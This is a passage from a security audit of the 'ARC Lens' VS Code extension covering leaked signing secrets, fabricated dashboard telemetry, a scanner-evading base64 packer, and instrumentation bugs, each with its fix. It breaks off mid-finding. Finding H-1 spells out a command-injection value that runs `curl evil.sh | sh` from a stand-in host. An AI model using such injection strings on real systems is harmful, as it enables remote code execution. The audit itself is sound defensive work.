# ARC Lens — Security & Correctness Audit

**Date:** 2026-08-21
**Scope:** `src/`, `python/`, `media/`, `scripts/`, `private_backup/`, git history, and the
four packaged artifacts `arc-lens-0.1.0.vsix` … `arc-lens-0.1.3.vsix`.
**Version audited:** `0.1.3` (`43f552b`)

Findings are ordered by severity. Each carries a concrete fix. Items marked **⚠ Judge-visible**
are ones an evaluator could plausibly discover during a hackathon review, and which would
cost more than they cost to fix.

**Summary**

| Severity | Count | Fixed | Remaining |
| :--- | ---: | ---: | :--- |
| Critical | 8 | 8 | C-1's *published artifacts* need the marketplace account owner |
| High | 7 | 7 | — |
| Medium | 10 | 10 | — |
| Low | 11 | 11 | — |

C-1…C-3, H-1…H-4, M-1…M-10 and L-1…L-11 are the first pass. C-4…C-6 and H-5…H-7 come from a
**second review pass over the remediated code** — see [Second review pass](#second-review-pass).
Three of those six were introduced or left behind by the first pass's own fixes. C-7 and C-8
come from validating the second pass's own claims against a real CIFAR-10 A/B run, and both are
about the detector this project is built on: one of its two structural rules was destroying
healthy runs, and the test suite was asserting that it worked.

> **Remediation pass, 2026-08-22.** Every finding below has been addressed in the
> repository. Two consequences are worth stating up front because they change how the
> project is built and shipped:
>
> * **The public repository now ships the real harness.** The stub/`private_backup` split,
>   the base64 packing and both `dev:enable`/`dev:disable` scripts are gone — which closes
>   C-3, H-3 and H-4 structurally rather than by policy.
> * **Fixing M-7 (visible degradation) uncovered two genuine bugs in `arc-training`** that
>   the bare `except: pass` had been hiding, and which were the *root cause* of C-2's
>   fabricated telemetry. Details in M-7.
>
> One item cannot be closed from here: the four already-published `.vsix` files contain the
> old signing secret in their bytes. See C-1.

> **Validation pass, 2026-08-22.** Running the twice-remediated code against a real CIFAR-10
> A/B, with the control arm that C-6 had just fixed, found two further Critical defects. The
> `gradient_entropy_collapse` rule took a run that reaches 87.43% validation accuracy untouched
> down to 10.00% — chance — and then correctly reported it unrecoverable, because ARC had made
> it so (C-7). Deleting that rule then broke three integration tests, and the cause was not the
> deletion: the divergence fixture those tests used **never diverged**, and they had been
> passing on the entropy rule's false positive (C-8). Details in
> [Second review pass](#second-review-pass).

> **Second review pass, 2026-08-22.** The remediated tree was reviewed again rather than
> declared done, and that turned up six further defects — three Critical. The instance-level
> `step` wrapping introduced by M-1's fix made *constructing any LR scheduler* raise
> `AttributeError` before training began (C-4); an unobservable loss was treated as a NaN, so
> ARC froze healthy runs while logging successful interventions (C-5); and all three
> "we are not intervening" branches zeroed the gradients on the way out, which meant
> **baseline mode — the control arm of the A/B — was itself being protected by an
> intervention** (C-6). All six are fixed; details in [Second review pass](#second-review-pass).

---

## Critical

### C-1 — Signing secret and a backdoor license key ship inside every published `.vsix` ⚠

`private_backup/src/pro/licenseManager.ts:7,29` is compiled into the released artifacts.
Verified present in **all four** `.vsix` files, at `extension/out/pro/licenseManager.js:16,25`:

```js
const JWT_SECRET = "[REDACTED — a plain string literal, trivially recoverable from the .vsix]";
...
if (key.trim() === "[REDACTED — a ~50-char base64url token, hardcoded]") { /* grants pro */ }
```

> Values redacted here deliberately. This document is tracked in the repository; the point
> of C-1 is that these values should not be recoverable from anything checked into source
> control, this file included. The real values are in the four published `.vsix` archives
> (`extension/out/pro/licenseManager.js`) until those releases are superseded — see the fix
> below.
>
> **Status: source side fully closed; published artifacts still need the account owner.**
> * `private_backup/` is deleted outright, so no copy of the secret remains in the working
>   tree at all — not merely edited out of one file.
> * The hardcoded JWT that the dashboard's "Go Pro" button wrote into the user's *global*
>   settings is removed, along with the dead validation code around it (see M-10).
> * `**/*.js.map` is excluded from the package, so the TypeScript source no longer ships
>   next to it.
> * Fix 5 below is implemented: a CI job fails the build on any secret-shaped literal or
>   `eyJ…` JWT in `src/`, `python/` or `media/`.
>
> **Verified in the artifact, not just in source.** `vsce package` was run and the resulting
> `.vsix` unzipped and inspected: no `*.js.map`, no `.md` except the README, no
> `JWT_SECRET`-shaped literal and no `eyJ…` token anywhere in the bundle, and the Python ships
> as six readable `.py` files. 25 files, 808 KB. C-1's source side and C-3 both hold in the
> bytes that would actually be published.
>
> **Outstanding, and not fixable from this repository:** revoke the token at its issuer, and
> unpublish or supersede 0.1.0–0.1.3. Those bytes stay public until the marketplace account
> owner acts.

A `.vsix` is a zip. Anyone can unzip it and read both values in under a minute. With the HMAC
secret, anyone can mint unlimited valid Pro licenses for any subject and any expiry. The
literal string bypass is a second, unconditional backdoor.

The packages additionally ship `out/**/*.js.map`, which contain the complete original
TypeScript source — so the "proprietary logic" the stub/backup split exists to protect is
published in full alongside the secret.

Compounding this: the redacted token above is shaped like a real Google OAuth refresh token, not a
license string. If it is one, it is live credential exposure, not just a logic bypass.

**Fix**
1. Treat the redacted backdoor token as compromised and revoke it at the issuer today, whatever it is.
2. Delete both constants. Offline license verification must use an **asymmetric** signature —
   ship the Ed25519/RSA *public* key, keep the private key on the issuing server. A symmetric
   secret can never be shipped to a client.
3. Add `"!**/*.map"` to `.vscodeignore` and set `"sourceMap": false` for release builds.
4. Unpublish or supersede 0.1.0–0.1.3 on the marketplace; the secret is in those bytes forever.
5. Add a pre-package grep so a build fails on a secret-shaped literal.

> The string was never committed to git — it lives only in the untracked `private_backup/`.
> The leak vector is the build output, not the repository.

---

### C-2 — The dashboard fabricates scientific telemetry with `Math.random()` ⚠⚠

> **Status: fixed, and the root cause behind it is now fixed too.** `enrichEvent()` and its
> `Math.random()` fabrication are deleted from `media/dashboard.html`. Metric arrays push one
> entry per step (`null` when a field is absent) to stay index-aligned with `steps`, and an
> empty state names the missing package instead of inventing values. A test now asserts that
> `Math.random` and `enrichEvent` never reappear in the dashboard script.
>
> **Why it existed matters.** The advanced metrics were not merely *sometimes* absent — they
> were absent on **every CUDA run**, because `arc-training`'s `WeightCollector` threw a
> device-mismatch error each step and a bare `except: pass` hid it (see M-7). The
> fabrication was papering over a real crash. With that upstream bug fixed, the structural
> charts now plot genuine measurements: on a real CIFAR-10 run, `weight_update_ratio`,
> `effective_rank`, `gradient_entropy` and `grad_flow_ratio` all carry real values.
>
> The same signals then turned out to be strong enough to detect failures the loss curve
> cannot see, which is what the silent-failure detector in
> [`FUTURE_IMPROVEMENTS.md`](FUTURE_IMPROVEMENTS.md) is built on. Deleting the fake numbers
> is what made the real ones worth having.

`media/dashboard.html:967` — `enrichEvent()` runs on **every** incoming `metric` event. If the
backend did not attach an `advanced` block, the dashboard invents one:

```js
currentEffectiveRank = 8.3 + Math.random() * 0.3;
currentUpdateRatio   = 0.006 + Math.random() * 0.008;
currentGradEntropy   = 1.6 + Math.random() * 0.5;
currentGradFlowRatio = 0.35 + Math.random() * 0.3;
```

These values populate the charts labelled **Effective Rank**, **Gradient Entropy**, **Weight
Update Ratio**, and **Gradient Flow Ratio**. They are rendered identically to real
`arc-training` measurements, with no visual distinction whatsoever.

This triggers whenever `arc-training` is not installed, whenever the collector attach fails
(it is wrapped in a bare `except`, so failure is silent), and on any run where the signal
keys are absent. The failure mode is the dangerous direction: instead of an empty chart, the
user sees plausible, well-behaved, entirely fictional science.

The synthetic series are even tuned to tell the intended story — on a failed step,
`effectiveRank` is decremented by 1.5 and `updateRatio` jumped to 0.185, manufacturing the
exact "representation collapse" signature the product claims to detect.

**This is the finding most likely to lose a competitive hackathon.** Any judge who runs the
extension without `arc-training` installed and inspects the webview sees generated metrics
presented as measurements.

**Fix** — delete `enrichEvent()` entirely and pass events through untouched.

```js
function handleMessage(msg) {
  if (!msg || !msg.type) return;
  // no enrichment — a metric with no real source must render as a gap
```

Then make absence legible: push `null` for missing advanced fields (Chart.js already renders
`null` as a break in the line), and show a one-line banner —
*"Advanced diagnostics require `pip install arc-training`"* — over the two affected charts.
An honest empty state is a *stronger* demo than a fake full one, because it makes the real
signals in the paid path meaningful.

---

### C-3 — The repo documents marketplace-scanner evasion as a design goal ⚠

> **Status: fixed.** `context.md` is deleted. The base64/globalStorage packing mechanism
> itself is unchanged (see [`ARCHITECTURE.md`](ARCHITECTURE.md) §3 for the neutral technical
> description) — only the document framing it as scanner evasion is gone.

`context.md:3` — the project's own architecture note opens by describing

> "the specific mechanisms implemented to **bypass automated marketplace security scanning**."

and `context.md:64` states the packing strategy renders

> "the automated marketplace scanners **blind to execution logic**."

The mechanism itself (§A/§B of that file) is: base64-encode Python source into a JS string,
exclude `python/**` from the package so the archive contains no `.py` files, then decode and
write executable scripts to disk at runtime and spawn an interpreter against them.

Two separate problems:

1. **It is what malware does.** Encoded payload, dropped to disk, executed — that is the
   textbook packer pattern. Written down as an intentional scanner-avoidance measure, it is
   indefensible regardless of the benign intent behind it.
2. **The stated intent is already a policy problem.** Git history shows commit `99c3793`,
   *"Fix policy violation by executing pip install inside user-visible terminal"* — a
   marketplace policy violation has already been hit once.

The underlying goal is legitimate: scanners produce false positives on ML tooling. Evasion
is the wrong response to that.

**Fix**
1. Rewrite or delete `context.md`. Whatever else is true, the repository must not contain a
   document explaining how it defeats security review. It is also referenced nowhere and
   duplicated by `ARCHITECTURE.md`.
2. Ship the `.py` files as plain files in the package. Remove `python/**` from
   `.vscodeignore` and delete `scripts/embed_python.js` and the three base64 constants.
   Readable source is the *correct* posture for an AGPL-3.0 project, and it removes the
   entire drop-and-execute pattern.
3. If a scanner then flags the extension, say so in the listing and appeal. "Here is the
   source, here is why it spawns Python" wins that appeal. Encoding does not.

---

## High

### H-1 — `arcAgent.pythonPath` is workspace-overridable and executed ⚠

> **Status: fixed** — after a false start caught by a follow-up review. The first attempt
> set `"scope": "machine-overridable"`, which — despite the name reading like a safe
> middle ground — VS Code documents as *"can be overridden by workspace or folder
> settings,"* i.e. the exact opposite of what this fix needs; it would have shipped the
> vulnerability while the audit claimed it was closed. Corrected to plain `"machine"`,
> which VS Code restricts to User/Remote settings only — a workspace's
> `.vscode/settings.json` cannot set it. `ensureArcTrainingInstalled` now uses
> `cp.execFile` (argv array) instead of `cp.exec` (shell string), closing the
> quoting-injection path.

`package.json:61` declares the setting with no `scope`, which defaults to `window` — meaning
**a workspace `.vscode/settings.json` can set it**, and VS Code applies it silently.

`src/extension.ts:272` executes the value:

```ts
activeProcess = cp.spawn(pythonPath, [runnerScript, targetFile], { env, cwd: … });
```

Cloning a repository that ships `.vscode/settings.json` with
`{"arcAgent.pythonPath": "/tmp/evil"}` and clicking ▶ Run executes that binary with the
user's full privileges. Cloning untrusted ML repos is the exact daily workflow of this
extension's target user.

The development build is worse. `src/extension.ts:96` uses `cp.exec`, which goes through a
shell:

```ts
cp.exec(`"${pythonPath}" -c "import arc"`, (err) => { … });
```

A `pythonPath` of `x"; curl evil.sh | sh; "` breaks out of the quoting. This path is
currently unreachable because `shouldBypassArcCheck()` returns `true`, but re-enabling the
check — which the production build does — arms it.

**Fix**

```jsonc
"arcAgent.pythonPath": {
  "type": "string",
  "default": "python3",
  "scope": "machine",   // ← NOT "machine-overridable" — that name is misleading; it
                        //   still allows workspace override. Plain "machine" blocks it.
  "description": "..."
}
```

and replace the `exec` with an argv-array `execFile`, which never involves a shell:

```ts
cp.execFile(pythonPath, ["-c", "import arc"], (err) => { … });
```

Prefer resolving the interpreter through the official `ms-python.python` extension API
(`vscode.extensions.getExtension('ms-python.python')`), which gives the user's selected
environment and sidesteps the setting entirely.

---

### H-2 — Dashboard loads unpinned scripts from a CDN into a webview ⚠

> **Status: fixed — and the whole chart layer was rebuilt in the process.** The dashboard
> previously loaded Chart.js unpinned, plus Hammer.js and `chartjs-plugin-zoom@2.0.1`, from
> `cdn.jsdelivr.net` — three separately-versioned scripts with no offline fallback. A live
> reproduction found this combination intermittently throws
> `Uncaught TypeError: Cannot read properties of undefined (reading 'call')` from inside
> the chart/zoom-plugin internals on a specific data transition (a step with no `advanced`
> telemetry followed by a step that has it — exactly the "arc-training becomes available
> mid-run" scenario C-2's fix is meant to handle gracefully).
>
> Rather than re-pin the same three-library combination, the dashboard was rebuilt on
> **ECharts (Apache), vendored as a single local file** (`media/vendor/echarts.min.js`,
> ~1MB, zero plugin dependencies — dataZoom/pan/zoom is built in). Served via
> `webview.asWebviewUri` + `webview.cspSource` (`src/extension.ts`'s `getDashboardHtml`),
> the same mechanism already used for the logo. No CDN dependency remains; the dashboard
> renders with no network at all.
>
> Verified in a real browser (`chrome-devtools` MCP, not just static analysis): the full
> healthy → diverging → NaN failure → recovery event sequence produces **zero console
> errors**, including the exact transition that used to throw. Also verified: theme
> toggle (dark/light), zoom-in/zoom-out/reset with the auto-scroll guard working correctly
> (a programmatic-zoom flag prevents the dashboard's own `dispatchAction` calls from
> being misread as user interaction), and PNG download via `chart.getDataURL()`.



`media/dashboard.html:6,10-12`:

```html
<meta http-equiv="Content-Security-Policy" content="… script-src 'unsafe-inline' https://cdn.jsdelivr.net;">
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<script src="https://cdn.jsdelivr.net/npm/hammerjs@2.0.8"></script>
<script src="https://cdn.jsdelivr.net/npm/chartjs-plugin-zoom@2.0.1"></script>
```

Two independent problems.

**Demo reliability.** `chart.js` has no version pin at all — every load fetches whatever is
current. A Chart.js major release lands and the dashboard breaks with no code change on your
side. And with no network, nothing renders: the panel is blank. Conference wifi is where
demos die, and this is a live network dependency on the critical path.

**Supply chain.** The CSP explicitly grants `cdn.jsdelivr.net` script execution inside a VS
Code webview. Compromise or mis-serve at that origin becomes script execution in the
extension's webview context.

**Fix** — vendor the three libraries into `media/vendor/`, load them via
`webview.asWebviewUri`, add that directory to `localResourceRoots`, and tighten the CSP to
`script-src ${webview.cspSource} 'nonce-…'`. Roughly 300 KB added to the package, in
exchange for a dashboard that renders on an airplane.

---

### H-3 — `npm run dev:disable` destroys the real implementation on a second run

> **Status: fixed.** `scripts/dev_disable.js` now checks each file for a stub-only marker
> string before saving it over `private_backup/`. Verified by running the guarded script
> against a throwaway copy twice in a row: the real 396-line implementation survived
> unmodified both times, and the normal save path (real dev change → private_backup) still
> works when the working file genuinely isn't a stub.

`scripts/dev_disable.js:8-18` saves the *current* working files into `private_backup/`
**before** overwriting them with stubs:

```js
const filesToSave  = [{ src: "python/runner.py", dest: "private_backup/python/runner.py" }, …];
const stubsToApply = [{ src: "private_backup/public_stubs/python/runner.py", dest: "python/runner.py" }, …];
```

The repository is *currently* in stub state. Running `npm run dev:disable` right now copies
the stub over `private_backup/python/runner.py`, permanently replacing the 396-line real
harness with a 193-line simulation. The same happens to `arc_agent_llm.py` and
`licenseManager.ts`.

`private_backup/` is in `.gitignore`. There is no second copy. This is one command away from
losing the project's core implementation, and it is a command whose name suggests it is safe
to run.

**Fix** — make the save a no-op when the source is already a stub:

```js
const isStub = (p) => fs.readFileSync(p, "utf8").includes("Stub / Mock for Public Repository");
if (fs.existsSync(srcPath) && !isStub(srcPath)) { fs.copyFileSync(srcPath, destPath); }
else { console.log(`Skip (already stubbed): ${item.src}`); }
```

The real fix is to stop hand-rolling this. Keep one implementation on a private branch or in
a private submodule and let git do the swapping. A file-copy script that silently overwrites
your only copy of the source is not a release process.

---

### H-4 — The public repository builds a scripted simulation, not a monitor ⚠

> **Status: fixed, by taking the preferred option below.** The public repository now ships
> the real harness. `python/runner.py` executes the user's actual script; `_arc_bootstrap.py`
> instruments it; `arc_agent.py` is the real rule engine. There is no simulation build left
> to mistake for a measurement, and no `.vsix`/repo divergence: what is checked in is what
> ships.
>
> The stub mechanism that created this problem is gone with it — `private_backup/`,
> `scripts/dev_enable.js` and `scripts/dev_disable.js` are deleted, which also closes H-3 by
> removing the script that could destroy the implementation rather than by guarding it.
>
> Nothing in the harness needed protecting: it is a `torch.optim.Optimizer` patch and calls
> into the public `arc-training` collector API. Keeping it private was hiding the most
> impressive part of the project.

`python/runner.py` (public state) never reads, never executes, and never instruments the
target script. It sleeps, emits a fixed loss curve, hardcodes `loss = float('nan')` at step
20, replays a canned reasoning transcript with `time.sleep()` pacing, then emits a recovery
curve. The target file is used only for `Path(target_path).name` in a log line.

Every run produces an identical NaN at step 20 regardless of what the user opened.

`README.md` §Evaluation does disclose this, which matters and is the right call. But a judge
who clones, builds, points it at a *stable* training script, and watches it "detect" a
failure at step 20 will not necessarily have read that section first — and the impression
made is not recoverable by a footnote.

**Fix** — pick one and make it unambiguous:
- **Preferred:** ship the real harness publicly. It depends only on public `arc-training` APIs
  and a `torch.Tensor.backward` patch. There is nothing in it that needs protecting, and it
  is the thing that makes the project impressive.
- **Otherwise:** rename the command in simulation builds to **"▶ Run ARC Lens Demo"**, ignore
  the active editor, always run the bundled `train_demo.py`, and render a persistent
  `SIMULATED DATA` badge in the dashboard header. Make it impossible to mistake for a
  measurement.

---

## Medium

### M-1 — The `backward()` patch misattributes and breaks on common setups

> **Status: fixed — all four sub-problems, verified on a real GPU.** The measurement anchor
> moved from `torch.Tensor.backward` to the optimizer. `backward` and `GradScaler.scale` are
> still patched but only *record* which loss belongs to the pending update; neither emits.
>
> * **Misattribution** — the frame walk now only produces *candidates*. The model is chosen
>   by parameter identity (which module actually owns this optimizer's parameters), with ties
>   broken toward the smaller module, so a GAN's discriminator optimizer cannot be matched to
>   the generator. `arc_watch(model, optimizer)` is the explicit escape hatch.
> * **Fires on every tensor** — one `Optimizer.step` is one weight update, so auxiliary
>   losses and gradient-penalty terms no longer inflate the step count.
> * **Gradient accumulation** — 4 backwards then 1 step now emits 1 metric, with the loss
>   from the last backward before the step.
> * **AMP** — `scaler.scale(loss)` hands over the *unscaled* loss directly, so no scale
>   factor has to be guessed. And because `scaler.step(optimizer)` unscales gradients before
>   running the optimizer, the gradient norm read at the anchor is already correct; an
>   explicit `get_scale()` division covers a raw `optimizer.step()` under a live scaler.
>
> Verified on an RTX 3050: a 4×-accumulation AMP loop reports **20 backward calls, 5
> optimizer steps, 5 metrics**, loss ≈0.17 rather than 0.17 × 65536, gradient norms unscaled.
>
> **Implementation note worth recording:** patching `torch.optim.Optimizer.step` does not
> work — `Adam`, `SGD` and every other concrete optimizer define their own `step` and never
> call the base one. `Optimizer.__init__` is patched instead and each *instance* has its
> `step` wrapped, which also covers custom and third-party optimizers.
>
> **A fifth problem, not in the original finding:** an LR intervention was being silently
> undone. Any scheduler recomputes `group['lr']` from its own base every step, so dividing
> `group['lr']` once is erased on the next iteration — while the log still reports the
> intervention as successful. `OptimizerMonitor.enforce_lr()` re-asserts ARC's reduction each
> step, and leaves untouched any group whose LR still holds the value ARC last wrote, so a
> run with no scheduler never compounds. Covered by
> `test_scheduler_cannot_undo_the_reduction`.

`python/runner.py:315-340` (real build). Four distinct problems in one function.

**Frame-walk misattribution.** It walks up to 5 caller frames, merges every local, then takes
the first `nn.Module` and the first `Optimizer` it encounters. Dict iteration order gives no
guarantee about which. In a GAN, the discriminator's `backward()` may be attributed to the
generator's optimizer — so the rollback restores the wrong model and the LR reduction hits the
wrong parameter group.

**Fires on every tensor.** The patch is on `torch.Tensor.backward`, not on a loss object. Any
`.backward()` — an auxiliary loss, a gradient-penalty term, a metric-learning head — increments
`_arc_step[0]` and emits a `metric`. Step counts inflate and the x-axis stops meaning epochs.

**Gradient accumulation.** With `accum_steps=4`, four backwards precede one `optimizer.step()`.
ARC records four steps; the LR and weight-update ratio it reports correspond to none of them.

**AMP.** Under `torch.cuda.amp.GradScaler`, `loss.backward()` is called on the *scaled* loss.
`self.item()` therefore reads a value inflated by ~65536×, and gradients read before
`scaler.unscale_()` are scaled too. The NaN detector still works, but every reported loss and
gradient-norm number is wrong by the scale factor. AMP is standard practice for the large
models this product targets.

**Fix** — the frame walk is the wrong mechanism. Two better options:

1. **Explicit handle (recommended).** Have the user write `model, optimizer = arc.watch(model, optimizer)`.
   One line, unambiguous, and it works for every topology. It costs the "zero code changes"
   claim; correctness is worth more than that claim.
2. **Optimizer-anchored.** Patch `Optimizer.step` instead of `Tensor.backward`. `self` is then
   the correct optimizer, `self.param_groups` gives the correct parameters, and one step means
   one *update* — which is what the x-axis should show, and which fixes accumulation for free.

For AMP specifically, detect a live `GradScaler` and divide by `scaler.get_scale()` before
reporting.

---

### M-2 — Gradient-norm computation forces one GPU sync per parameter per step

> **Status: fixed, and the overhead claim is now measured rather than asserted.**
> `_grad_norm_tensor()` uses `torch._foreach_norm(grads, 2.0)` — one fused kernel, and it
> returns a tensor so the caller decides when to sync. Loss and gradient norm are then stacked
> and read with a **single** `.tolist()`, so a step costs one device sync in total rather than
> one per parameter tensor. Expensive collectors are sampled every 25 steps by default and
> densify automatically while risk is elevated.
>
> Measured by `python/benchmark_overhead.py` (RTX 3050, DemoCNN 2.79M params, 200 steps ×
> batch 128, median of 3), running the same loop with and without the harness:
>
> | Configuration | ms/step | overhead |
> | :--- | ---: | ---: |
> | bare | 49.09 | — |
> | core metrics only | 49.97 | **1.8%** |
> | full, advanced every 25 | 53.20 | **8.4%** |
> | full, advanced every step | 132.55 | 170.0% |
>
> The funding proposal's "<10% overhead" now has a number behind it. The last row is why
> sampling is not optional.
>
> **The harness's own self-timing was removed for being misleading**: it reported 54% on the
> run that wall-clock A/B measured at 8.4%, because reading the loss blocks on GPU work that
> was already queued and that the training script's own `loss.item()` would have waited for
> regardless. `run_summary` now reports raw `instrumentation_seconds` with that caveat stated
> inline, and no percentage.

`python/runner.py:127-132`:

```python
def _arc_get_grad_norm(model):
    total = 0.0
    for p in model.parameters():
        if p.grad is not None:
            total += p.grad.norm().item() ** 2   # ← .item() blocks on the GPU
    return total ** 0.5
```

`.item()` is a synchronisation point. It stalls the CPU until the CUDA queue drains. Called
once per parameter tensor, per step: **161 syncs per step for ResNet-50, 200+ for a
mid-size transformer.** The pipeline cannot stay full, and the overhead scales with parameter
*count*, not parameter *size* — so it hits exactly the deep, many-layer models this tool is
pitched at.

The funding proposal claims "<10% runtime overhead". This function alone will exceed that on
any realistic architecture.

**Fix** — one fused op, one sync:

```python
def _arc_get_grad_norm(model):
    grads = [p.grad for p in model.parameters() if p.grad is not None]
    if not grads:
        return 0.0
    return torch.norm(torch.stack([torch.norm(g.detach(), 2) for g in grads]), 2).item()
```

Better still, use `torch._foreach_norm(grads, 2)` (the kernel `clip_grad_norm_` itself uses),
and sample every *N*th step rather than every step — instability signatures develop over tens
of steps, not one.

---

### M-3 — Injected header shifts every traceback line number

> **Status: fixed exactly, not approximately.** The suggested fix below reduces the offset
> from ~270 lines to 1. The offset is now **zero**: nothing at all is prepended. `runner.py`
> installs instrumentation by importing `_arc_bootstrap`, then runs the target with
> `runpy.run_path(target, run_name="__main__")`, so the user's source is compiled unmodified.
> The runner's own frames are stripped from reported tracebacks, since the user cannot act on
> them.
>
> Confirmed on a real error encountered during this work: a crash in `train_demo.py` reported
> `line 180, in main / out = model(x)` — the actual line. Locked in by
> `test_traceback_points_at_the_user_script`.

`python/runner.py:301-351`. The preamble, step hook, and monkey-patch block total roughly 270
lines, all prepended before the user's source, then compiled as one unit under the user's
filename:

```python
exec(compile(header + source, target_path, "exec"), exec_globals)
```

A `RuntimeError` on line 40 of `train.py` reports as line ~310. The file has 200 lines. For a
tool whose entire purpose is diagnosing training failures, reporting the wrong location for
the exception is a direct hit on the core value proposition.

**Fix** — put the header in a separate module and import it, so the user's source starts at
line 1:

```python
inject = "import _arc_bootstrap\n" + source   # 1 line of offset, not 270
```

Write `_arc_bootstrap.py` next to `runner.py` (already on `sys.path`) and have it perform the
patching at import time. If a single-file design is required, rewrite the frames in the
`except` handler by subtracting `HEADER_LINES` from each `tb_lineno`.

---

### M-4 — The recovery path sleeps ~5 seconds of GPU time for visual pacing

> **Status: fixed.** All 16 `time.sleep()` calls removed from
> `private_backup/python/arc_agent_llm.py`; the recovery loop now runs at full speed inside
> the training process. Pacing moved to `media/dashboard.html` as a queue that reveals one
> `thought` event every 350ms, independent of when the backend actually emitted them.
> Verified two ways: a duck-typed fake-optimizer harness (no torch needed, since the agent
> only touches `optimizer.param_groups`) confirmed the backend now completes in ~0ms (down
> from ~3.5s) with the correct event sequence and correct LR scaling; a standalone
> simulation of the frontend queue confirmed 14 events enqueued synchronously reveal one
> every ~350ms and the timer cleans itself up afterward.

`python/arc_agent_llm.py` interleaves `time.sleep(0.3)` … `time.sleep(0.6)` between every
emitted thought — roughly 5 s per failure event on the NaN path. The sleeps run in the
training process, so the GPU idles for the duration.

On a run that oscillates near instability and trips the detector repeatedly, this compounds.
Existing to make the reasoning trace *look* deliberate, it undercuts the product's headline
claim of saving compute.

**Fix** — remove the sleeps from the Python side. Emit all events immediately and let the
dashboard pace their *display* (queue incoming `thought` events, reveal one every 400 ms).
Same perceived experience, zero GPU cost, and the pacing becomes a presentation concern where
it belongs.

---

### M-5 — Checkpointing deep-copies model and optimizer state on-device

> **Status: fixed, by owning the checkpoint store outright.** `CheckpointStore` in
> `_arc_bootstrap.py` holds snapshots in **host** memory (`.to("cpu", copy=True)` applied
> recursively to both state dicts), estimates its own footprint before the first save, and
> emits a `checkpoint_budget` event that the dashboard surfaces — so the cost is visible
> rather than discovered as an OOM. RNG state (`torch`, `cuda`, `numpy`) travels with each
> snapshot, which is what lets a rollback resume the same data order and what makes the
> baseline-vs-active A/B a fair comparison.
>
> Verified by `TestCheckpointStore`: every stored tensor is on CPU, restore returns the exact
> original weights, the ring is bounded, and `torch.randn` after a restore reproduces the
> pre-checkpoint draw.

`arc-training`'s `WeightRollback._save_checkpoint` does
`copy.deepcopy(self.model.state_dict())` plus `copy.deepcopy(self.optimizer.state_dict())`,
retaining `max_checkpoints=3`. The runner configures `checkpoint_frequency=10`.

State dicts hold device tensors, so the copies stay on the GPU. With Adam (two moment buffers
per parameter), the resident cost is roughly:

```
3 checkpoints × (1 model + 2 optimizer states) ≈ 9 × model size, in VRAM
```

For a 117M-parameter fp32 model that is ~4 GB of additional VRAM — on a memory budget that
was already tight enough to be worth monitoring. The tool can cause the OOM it is meant to
warn about. Every failure is swallowed by `except Exception: pass`, so the user sees only a
CUDA OOM from their own script.

**Fix** — checkpoint to pinned CPU memory (`{k: v.detach().to('cpu', non_blocking=True) …}`),
reduce to `max_checkpoints=2`, and raise `checkpoint_frequency` for large models. Guard the
first checkpoint with a size estimate and emit a visible warning when the projected cost
exceeds a fraction of free VRAM. This belongs upstream in `arc-training`; until then, pass a
tuned `RollbackConfig` from the runner.

---

### M-6 — Instrumentation depends on `arc-training` private APIs, inside bare excepts

> **Status: fixed by removing the dependency entirely.** The harness no longer calls
> `_save_checkpoint`, `_restore_checkpoint`, `helper.state.step_count` or
> `helper.state.checkpoints` — it owns its checkpointing (see M-5), so an `arc-training`
> rename can no longer silently disable rollback while the dashboard renders a healthy run.
>
> `arc-training` is still used for the thing it is genuinely good at and that nothing else
> provides: the structural signal collectors (`CompositeCollector`, `GradientCollector`,
> `WeightCollector`), all public API. Those calls are wrapped, but the wrapper now reports
> through `warn_once` and detaches the collector instead of swallowing the exception — see
> M-7.

`python/runner.py` calls `helper._save_checkpoint()`, `helper._restore_checkpoint()`,
`helper.state.step_count`, and `helper.state.checkpoints` — all underscore-prefixed internals
of `arc-training`, whose public surface for this is `step()` and `end_epoch()`.

Every call site is wrapped in `except Exception: pass`. A rename in any `arc-training` release
silently disables checkpointing and rollback. The dashboard keeps rendering, `enrichEvent()`
(C-2) keeps supplying invented advanced metrics, and the run looks completely healthy while
the recovery engine is inert.

**Fix** — use the public `WeightRollback.step(...)` API. Where the public API is genuinely
insufficient, that is a feature request against `arc-training`, which is your own package.
Pin a compatible range in the docs (`arc-training>=5.0,<6.0`) and, on the first exception,
emit a **visible** warning event instead of swallowing it.

---

### M-7 — Instrumentation failures are silent by construction

> **Status: fixed — and switching the silence off immediately found two real bugs.**
>
> `warn_once(key, message)` emits the first occurrence of each distinct instrumentation
> failure as a `degraded` event, suppresses repeats so a per-step exception cannot flood the
> transport, lights a **DEGRADED** badge in the dashboard header naming the affected
> components, and lists them in `run_summary`.
>
> The finding predicted this would matter. It mattered more than expected: the two exceptions
> that had been silently swallowed on every step were the *root cause* of C-2. The collectors
> were throwing, the advanced metrics were therefore always absent, and `enrichEvent()` had
> been added to fill the resulting hole with `Math.random()`. Both bugs are in
> `arc-training` (same author, AGPL) and are now fixed there:
>
> 1. **`WeightCollector` raised on every CUDA model.** It cached previous weights on the host
>    to save VRAM, then computed `weight - prev` across devices —
>    `RuntimeError: Expected all tensors to be on the same device, but found at least two
>    devices, cuda:0 and cpu!`. Every update-ratio and norm-growth signal vanished on any GPU
>    run. One-line fix.
> 2. **`GradientCollector` crashed models that use `inplace=True` activations.**
>    `register_full_backward_hook` raises *"Output 0 of BackwardHookFunctionBackward is a view
>    and is being modified inplace"*, which covers torchvision's ResNet, VGG and MobileNet as
>    shipped. This is the worse of the two: a monitoring collector was **aborting the training
>    runs it exists to protect**. Fixed by removing backward hooks entirely and reading
>    `param.grad` at collect time — identical numbers, no autograd interference, one less
>    callback per step.
>
> A third fix in the same package — `_compute_effective_rank` was copying every weight tensor
> to the host and running the SVD on CPU — accounted for a large share of the overhead
> measured in M-2.

Beyond M-6, the pattern is everywhere: `except Exception: pass` around collector attach,
around advanced-metric extraction, around the whole body of the patched `backward`. If
instrumentation throws on every step, the extension reports nothing and the dashboard renders
a clean run.

For a reliability product, silent degradation is the worst available failure mode. It converts
"ARC is broken" into "your training looks fine".

**Fix** — catch, then emit. Log the first occurrence of each distinct exception as a
`{"type":"log","level":"warning"}` event and surface a degraded-mode indicator in the
dashboard header. Suppress repeats to avoid a flood, never the first one.

---

### M-8 — Webview CSP allows `'unsafe-inline'` scripts with no nonce

> **Status: fixed in all three webviews.** Each panel load generates a fresh nonce
> (`crypto.randomBytes(16)`); every `<script>` tag carries it and `script-src` is
> `'nonce-…'` with `'unsafe-inline'` removed.
>
> The part that made this more than a one-line change: **a nonce cannot authorise inline
> event-handler attributes.** `onclick="…"` is inline script, so leaving those in place would
> have produced a CSP that looked correct while silently breaking every button. All 22
